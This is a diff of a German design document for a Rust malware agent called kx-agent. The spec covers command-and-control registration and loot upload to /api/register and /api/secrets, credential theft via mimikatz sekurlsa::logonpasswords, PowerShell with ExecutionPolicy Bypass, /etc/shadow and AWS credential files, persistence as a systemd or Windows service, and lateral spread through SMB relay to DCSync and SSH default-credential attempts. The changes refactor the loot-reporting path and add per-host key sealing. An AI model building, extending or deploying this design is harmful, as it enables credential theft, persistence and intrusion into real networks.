@@ -25,10 +25,13 @@ Scan-und-Exploit-Logik (`kx_scanner`, `kx_exploit`).
 
 Der Wire-Vertrag liegt nicht in diesem Crate, sondern in `kx_core::c2` — Agent
 und C2-Server sprechen denselben Vertrag [c2.rs:C2Client]. Das Crate definiert
-deshalb **keine** eigenen Payload-Typen: `C2Client::register_host` nimmt direkt
-`kx_core::c2::RegisterRequest` und `C2Client::upload_secret` direkt
-`kx_core::c2::SecretUpload` entgegen [c2.rs:C2Client::register_host]
-[c2.rs:C2Client::upload_secret].
+deshalb **keine** eigenen Payload-Typen: der Port `C2Port` nimmt direkt
+`kx_core::c2::RegisterRequest` und `kx_core::c2::SecretUpload` entgegen
+[c2.rs:C2Port::registriere_host] [c2.rs:C2Port::melde_beute].
+
+Der Meldeweg selbst liegt in `meldung.rs`: Reihenfolge, Zaehlung und
+Verweigerung. `propagate.rs` **findet** und liefert Funde; `meldung.rs`
+**meldet** [propagate.rs:run_propagation] [meldung.rs:melde].
 
 Plattformabhängige Zugriffe (Secret-Extraktion, Persistenz) sind über
 `#[cfg(target_os = "windows")]` bzw. `#[cfg(unix)]` getrennt
@@ -50,10 +53,11 @@ Plattformabhängige Zugriffe (Secret-Extraktion, Persistenz) sind über
   Pflicht). Es existieren **keine** Subcommands.
 - `[main.rs:main]` — `async fn main()` mit `#[tokio::main]`, einziger
   Prozess-Einstiegspunkt.
-- `[main.rs:collect_local_secrets]` — `async fn collect_local_secrets(host_id: &str) -> Vec<kx_core::c2::SecretUpload>`;
+- `[main.rs:collect_local_secrets]` — `async fn collect_local_secrets() -> Vec<kx_core::secret::Secret>`;
   plattformabhängige Extraktion via `kx_win::extract_lsass`,
   `kx_win::extract_credential_manager` (Windows) bzw.
   `kx_posix::extract_shadow_hashes`, `kx_posix::extract_aws_credentials` (unix).
+  Das Versiegeln und das Melden liegen nicht hier, sondern in `meldung.rs`.
 - `[main.rs:install_persistence]` — `async fn install_persistence() -> Result<(), Box<dyn std::error::Error>>`;
   `kx_win::install_service` + `kx_win::start_service` (Windows) bzw.
   `kx_posix::install_systemd_service` (unix).
@@ -64,18 +68,44 @@ Der Client ist ein dünner Adapter über den Transport aus
 `kx_core::c2::transport` — TLS-Aufbau, Bearer-Header, URL-Bildung und
 Status→Fehler stehen dort, nicht in diesem Crate.
 
+- `[c2.rs:C2Port]` — `pub trait C2Port` mit genau zwei Aufrufen:
+  `registriere_host(&self, req: &RegisterRequest)` und
+  `melde_beute(&self, upload: &SecretUpload)`. Das ist der Seam, an dem der
+  Meldeweg testbar wird: hinter ihm stehen die `C2Client` im Betrieb und ein
+  Aufzeichner im Test. Der Transport ist blockierend, die Methoden sind
+  deshalb ehrlich synchron.
 - `[c2.rs:C2Client]` — `pub struct C2Client` mit privatem Feld
   `transport: Transport`.
 - `[c2.rs:C2Client::new]` — `pub fn new(server: &str, token: &str, server_cert: &str) -> Result<Self, TransportError>`;
   liest das Server-Zertifikat über `Transport::from_cert_file`.
-- `[c2.rs:C2Client::register_host]` — `pub async fn register_host(&self, req: &RegisterRequest) -> Result<(), TransportError>`;
-  POST `{base_url}/api/register`.
-- `[c2.rs:C2Client::upload_secret]` — `pub async fn upload_secret(&self, upload: &SecretUpload) -> Result<(), TransportError>`;
-  POST `{base_url}/api/secrets`.
-- `[c2.rs:C2Client::fetch_tasks]` — `pub async fn fetch_tasks(&self) -> Result<Vec<Task>, TransportError>`;
+- `[c2.rs:C2Client]` — implementiert `C2Port`; `registriere_host` POST
+  `{base_url}/api/register`, `melde_beute` POST `{base_url}/api/secrets`.
+- `[c2.rs:C2Client::fetch_tasks]` — `pub fn fetch_tasks(&self) -> Result<Vec<Task>, TransportError>`;
   GET `{base_url}/api/tasks`.
-- `[c2.rs:C2Client::report_task_result]` — `pub async fn report_task_result(&self, report: &TaskResultRequest) -> Result<(), TransportError>`;
+- `[c2.rs:C2Client::report_task_result]` — `pub fn report_task_result(&self, report: &TaskResultRequest) -> Result<(), TransportError>`;
   POST `{base_url}/api/tasks/result`.
+
+### meldung.rs — die Meldung an den C2
+
+Das Modul besitzt die Reihenfolge, die Zählung und die Verweigerung. Es
+erzeugt die Beute nicht — es meldet sie.
+
+- `[meldung.rs:HostFund]` — `pub struct HostFund` mit `host_id: String`,
+  `ip: String`, `os: Option<String>`, `status: String` und
+  `secrets: Vec<Secret>`. Die Einheit ist der Host, nicht das Stück: Beute
+  ohne Host ist für den Operator wertlos.
+- `[meldung.rs:Ergebnis]` — `pub struct Ergebnis` mit vier Zählern:
+  `hosts_registriert`, `hosts_verloren`, `beute_gemeldet`, `beute_verloren`.
+- `[meldung.rs:Ergebnis::c2_nicht_erreichbar]` — `pub fn c2_nicht_erreichbar(&self) -> bool`;
+  kein Host kam an.
+- `[meldung.rs:Ergebnis::fehlgeschlagen]` — `pub fn fehlgeschlagen(&self) -> bool`;
+  der C2 war nicht erreichbar, oder Beute ging verloren, die erbeutet war.
+- `[meldung.rs:Ergebnis::zusammenfuehren]` — `pub fn zusammenfuehren(self, andere: Ergebnis) -> Ergebnis`;
+  die Agent meldet in zwei Phasen, beide zählen in dieselbe Bilanz.
+- `[meldung.rs:melde]` — `pub fn melde(port: &dyn C2Port, sealer: Option<&KeySealer>, funde: &[HostFund]) -> Ergebnis`;
+  für jeden Fund: erst den Host registrieren, dann seine Beute melden. Schlägt
+  die Registrierung fehl, wird die Beute **nicht** gemeldet und zählt als
+  verloren.
 
 ### tasks.rs — Task-Ausführung
 
@@ -90,13 +120,11 @@ Status→Fehler stehen dort, nicht in diesem Crate.
 
 ### propagate.rs — Scan und Exploit
 
-- `[propagate.rs:PropagationResults]` — `pub struct PropagationResults` mit
-  genau zwei Feldern: `new_hosts: Vec<RegisterRequest>` und
-  `new_secrets: Vec<SecretUpload>`. Ein Feld `source_host` existiert **nicht**;
-  der Quellhost steht in jedem Element selbst (`host_id`).
-- `[propagate.rs:run_propagation]` — `pub async fn run_propagation(discovered: &[DiscoveredHost], relay_script: &str) -> PropagationResults`;
+- `[propagate.rs:run_propagation]` — `pub async fn run_propagation(discovered: &[DiscoveredHost], relay_script: &str) -> Vec<HostFund>`;
   nutzt `kx_scanner::scan_tcp`, `kx_exploit::smb_relay_dcsync`,
-  `kx_exploit::try_default_credentials`.
+  `kx_exploit::try_default_credentials`. Liefert je Host einen Fund: der Host
+  und das, was auf ihm erbeutet wurde. Die Wire-Typen entstehen erst beim
+  Melden.
 - `[propagate.rs:service_for_port]` — `fn service_for_port(port: u16) -> &'static str` (privat);
   festes Port-zu-Dienst-Mapping, deckungsgleich mit der Scanliste: 22 `ssh`,
   80 `http`, 135 `msrpc`, 443 `https`, 1433 `mssql`, 1521 `oracle`, 3306 `mysql`,
@@ -123,9 +151,18 @@ Status→Fehler stehen dort, nicht in diesem Crate.
 
 - Die Host-Kennung des Agenten ist seine eigene IP: `let own_ip: Ipv4Addr = args.own_ip.parse()...; let host_id = own_ip.to_string();`.
   Eine Funktion `local_host_id` existiert im Crate **nicht** [main.rs:main].
-- Der Agent registriert sich selbst **vor** der Extraktion: „0. Der Agent registriert sich selbst. Sonst zeigen die lokal erbeuteten Secrets auf einen Host, den der C2-Server nicht kennt." [main.rs:main].
+- Der Agent meldet sich selbst **zusammen mit seiner Beute**: ein Fund, ein
+  Aufruf. Das Melde-Modul registriert den Host und meldet danach seine Beute
+  — die Reihenfolge liegt dort, nicht beim Aufrufer [meldung.rs:melde].
+- Jeder Fund meldet **erst den Host, dann seine Beute**. Schlägt die
+  Registrierung fehl, wird die Beute nicht gemeldet — sie bleibt beim Agenten
+  und zählt als verloren [meldung.rs:melde].
+- Jeder Master-Key entsteht je Host **einmal** für die ganze Laufzeit. Derselbe
+  Schlüssel versiegelt die Beute des Hosts und geht als `sealed_master` bei
+  seiner Registrierung mit [hostkey.rs:KeySealer::schluessel_fuer].
 - Jedes lokal extrahierte Secret trägt die Host-Kennung des Agenten — der Host, bei dem es erbeutet wurde, ist hier der Agent selbst [main.rs:collect_local_secrets].
-- Die Ziel-Host-Kennung reist im Upload mit und kann nicht mehr auseinanderlaufen: „Die Ziel-Host-Kennung steht im Upload selbst — sie kann nicht mehr auseinanderlaufen." [c2.rs:C2Client::upload_secret].
+- Die Beuteaufnahme existiert genau einmal: `Secret` → versiegeln → `SecretUpload` liegt im Melde-Modul. `propagate.rs` und `main.rs` bauen den Upload nicht mehr selbst [meldung.rs:melde].
+- Die Ziel-Host-Kennung reist im Upload mit und kann nicht mehr auseinanderlaufen: „Die Ziel-Host-Kennung steht im Upload selbst — sie kann nicht mehr auseinanderlaufen." [c2.rs:C2Port::melde_beute].
 - `SecretUpload.host_id` muss auf einen registrierten Host verweisen; der Server lehnt eine leere Kennung ab [kx-core/src/c2.rs:SecretUpload](../../kx-core/src/c2.rs).
 - Jeder Host wird **genau einmal** pro Propagationslauf registriert. Der Push liegt nach der Port-Schleife; vorher wurde er pro offenem Port gepusht, wodurch ein späterer Eintrag mit Status `discovered` den Status `compromised` überschrieb [propagate.rs:run_propagation].
 - Der SMB-Relay-Zweig (Port 445) wird erreicht, wenn der Scan mit `kx_scanner::COMMON_PORTS` läuft und diese Liste 445 enthält — **ohne 445** — ist [propagate.rs:run_propagation] [kx-scanner/src/tcp_scan.rs:COMMON_PORTS](../../kx-scanner/src/tcp_scan.rs).
@@ -158,8 +195,8 @@ Status→Fehler stehen dort, nicht in diesem Crate.
 - Die für den ARP-Sweep verwendete MAC-Adresse ist der Platzhalter `own_mac = [0x00; 6]` [main.rs:main].
 - Der Logfilter stammt aus `tracing_subscriber::EnvFilter::try_from_default_env()` (liest `RUST_LOG`) und fällt bei Fehlschlag auf `"info"` zurück [main.rs:main].
 - `std::process::exit(1)` wird bei fehlgeschlagener C2-Client-Initialisierung und bei fehlgeschlagenem ARP-Sweep ausgelöst [main.rs:main].
-- `std::process::exit(1)` wird am Ende des Laufs ausgelöst, wenn die Selbstregistrierung fehlgeschlagen ist oder wenn es mindestens ein Secret gab, aber **kein** Upload geklappt hat. Ein Host ohne jeden Fund ist kein Fehlschlag — der Lauf hat den C2 erreicht. Ein Lauf, der nichts erreicht, meldet keinen Erfolg [main.rs:main].
-- Fehler beim Upload lokaler Secrets werden geloggt, die Schleife läuft weiter; in der Reporting-Phase werden die Resultate von `register_host` und `upload_secret` verworfen (`let _ =`) [main.rs:main].
+- `std::process::exit(1)` wird am Ende des Laufs ausgelöst, wenn der C2-Server nicht erreichbar war (kein Host kam an) **oder** wenn Beute verloren ging, die der Agent erfolgreich erbeutet hatte. Ein Host ohne jeden Fund ist kein Fehlschlag — der Lauf hat den C2 erreicht. Ein gescheiterter Exploit ist ebenfalls kein Fehlschlag: nichts gefunden ist ein Ergebnis [meldung.rs:Ergebnis::fehlgeschlagen] [main.rs:main].
+- Fehler beim Melden werden **nicht** verworfen: jeder fehlgeschlagene Upload und jede fehlgeschlagene Registrierung wird geloggt und gezählt. Der Zähler entscheidet über den Exit-Code [meldung.rs:melde].
 - Feste `cred_type`/`source`-Paare: Windows-LSASS nutzt `secret_type` mit Quelle `"lsass"`, Credential Manager nutzt `"credential_manager"` mit Quelle `"cmdkey"`; unix nutzt `"shadow"` mit Quelle `"/etc/shadow"` und `"aws"` mit Quelle `"~/.aws/credentials"` [main.rs:collect_local_secrets].
 - Erbeutete Credentials werden mit festen Werten erfasst: SMB-Relay als `cred_type` `"nt_hash"` mit Quelle `"smb_relay"`, SSH-Default-Credentials als `cred_type` `"password"` mit Quelle `"default_creds"` [main.rs:collect_local_secrets] [propagate.rs:run_propagation].
 - Der Servicename ist auf beiden Plattformen `"kx-agent"`; der Windows-Anzeigename ist `"Kx Agent"`, unix übergibt eine leere Beschreibung [main.rs:install_persistence].
@@ -178,9 +215,10 @@ Status→Fehler stehen dort, nicht in diesem Crate.
 - `[main.rs:main]` — Führt einen ARP-Sweep des konfigurierten Bereichs aus: `kx_scanner::arp_sweep(&args.iface, &range_start, &range_end, &own_ip, &own_mac)`; erzeugt Netzwerkverkehr auf dem genannten Interface.
 - `[propagate.rs:run_propagation]` — Führt den TCP-Connect-Scan über `kx_scanner::scan_tcp(&ips, kx_scanner::COMMON_PORTS, 1000)` auf allen entdeckten IPs aus; je Host und Port wird eine Task gespawnt, die einen `TcpStream::connect` mit Timeout versucht [kx-scanner/src/tcp_scan.rs:scan_tcp](../../kx-scanner/src/tcp_scan.rs).
 - `[main.rs:collect_local_secrets]` — Greift auf Credential-Material des lokalen Hosts zu: `kx_win::extract_lsass()` und `kx_win::extract_credential_manager()` (Windows), `kx_posix::extract_shadow_hashes()` und `kx_posix::extract_aws_credentials()` (unix).
-- `[main.rs:main]` — Meldet sich selbst beim C2-Server an (`host_id` = `ip` = eigene IP, Status `"agent"`); ein Fehler wird geloggt, nicht zum Abbruch [main.rs:main].
-- `[main.rs:main]` — Lädt jedes lokal extrahierte Secret per `client.upload_secret(s)` an den C2-Server hoch; Fehler je Secret werden geloggt, die Schleife läuft weiter.
-- `[main.rs:main]` — Meldet alle propagierten Hosts und Secrets per `client.register_host(h)` und `client.upload_secret(s)` an den C2-Server; die Rückgabewerte werden verworfen (`let _ =`).
+- `[meldung.rs:melde]` — Meldet jeden Fund beim C2-Server an: erst den Host (`POST /api/register`, `host_id` = `ip` = eigene IP für den eigenen Host, Status `"agent"`), dann seine Beute (`POST /api/secrets`). Schlägt die Registrierung fehl, wird die Beute nicht gemeldet [meldung.rs:melde].
+- `[hostkey.rs:KeySealer::schluessel_fuer]` — Kapselt je Host einmal für die ganze Laufzeit einen Master-Key gegen den öffentlichen Server-Schlüssel; der Key geht als `sealed_master` bei der Registrierung mit und versiegelt die Beute desselben Hosts [hostkey.rs:KeySealer::schluessel_fuer].
+- `[meldung.rs:melde]` — Lädt jedes Stück Beute per `client.melde_beute(upload)` an den C2-Server hoch; Fehler je Stück werden geloggt und gezählt, die Schleife läuft weiter.
+- `[meldung.rs:melde]` — Meldet alle propagierten Hosts und ihre Beute an den C2-Server; die Reihenfolge ist Host zuerst, Beute danach, die Rueckgabewerte werden nicht verworfen.
 - `[main.rs:install_persistence]` — Liest den Pfad der eigenen Executable über `std::env::current_exe()`.
 - `[main.rs:install_persistence]` — Installiert und startet unter Windows den Dienst via `kx_win::install_service("kx-agent", &exe, "Kx Agent")` und `kx_win::start_service("kx-agent")`; unter unix via `kx_posix::install_systemd_service(&SystemdService { … })`.
 - `[main.rs:install_persistence]` — Schreibt unter unix die Unit-Datei `/etc/systemd/system/kx-agent.service`, die Timer-Datei `/etc/systemd/system/kx-agent.timer` und die Environment-Datei `/etc/kx/kx-agent.env` (0600, Verzeichnis 0700); jede Datei nur, wenn sich ihr Inhalt ändert. Führt `systemctl daemon-reload` (nur nach einer Änderung), `systemctl enable kx-agent` und `systemctl enable --now kx-agent.timer` aus [kx-posix/src/persist.rs:install_systemd_service](../../kx-posix/src/persist.rs).
@@ -189,8 +227,8 @@ Status→Fehler stehen dort, nicht in diesem Crate.
 - `[main.rs:collect_local_secrets]` — Liest unter unix `/etc/shadow` [kx-posix/src/secrets.rs:extract_shadow_hashes](../../kx-posix/src/secrets.rs) und `$HOME/.aws/credentials` (mit `HOME` als Env-Variable, Fallback `/root`) [kx-posix/src/secrets.rs:extract_aws_credentials](../../kx-posix/src/secrets.rs).
 - `[main.rs:collect_local_secrets]` — Spawnt unter Windows `powershell.exe -NoProfile -ExecutionPolicy Bypass -Command ...` für den Credential Manager [kx-win/src/secrets.rs:extract_credential_manager](../../kx-win/src/secrets.rs) und `mimikatz.exe sekurlsa::logonpasswords` für LSASS [kx-win/src/secrets.rs:extract_lsass](../../kx-win/src/secrets.rs).
 - `[c2.rs:C2Client::new]` — Liest das Server-Zertifikat (PEM) per `std::fs::read` von der Platte; der `ureq::Agent` des Transportes vertraut genau diesem PEM über `kx_tls::client_config_trusting` [kx-core/src/c2/transport.rs:Transport::from_cert_file](../../kx-core/src/c2/transport.rs).
-- `[c2.rs:C2Client::register_host]` — Sendet einen HTTP-POST an `{base_url}/api/register` mit JSON-Body = serialisierter `RegisterRequest` und Header `Authorization: Bearer {token}`.
-- `[c2.rs:C2Client::upload_secret]` — Sendet einen HTTP-POST an `{base_url}/api/secrets` mit JSON-Body = serialisierter `SecretUpload` und Header `Authorization: Bearer {token}`.
+- `[c2.rs:C2Port::registriere_host]` — Sendet einen HTTP-POST an `{base_url}/api/register` mit JSON-Body = serialisierter `RegisterRequest` und Header `Authorization: Bearer {token}`.
+- `[c2.rs:C2Port::melde_beute]` — Sendet einen HTTP-POST an `{base_url}/api/secrets` mit JSON-Body = serialisierter `SecretUpload` und Header `Authorization: Bearer {token}`.
 - `[propagate.rs:run_propagation]` — Versucht SMB-Relay nach DCSync gegen Hosts mit Port 445 über `kx_exploit::smb_relay_dcsync(&relay_cfg)` unter Verwendung des Pfads `relay_script`; fehlt das Skript oder Impacket, endet der Versuch kontrolliert mit einem Fehler.
 - `[propagate.rs:run_propagation]` — Versucht einen SSH-Login mit Default-Credentials über `kx_exploit::try_default_credentials(&host_id, service)`; die Funktion startet je Kombination einen `sshpass`-Subprozess mit einer Zeitgrenze und bricht nach spätestens 60 s für alle Kombinationen ab [kx-exploit/src/credential_stuff.rs:try_default_credentials](../../kx-exploit/src/credential_stuff.rs).
 
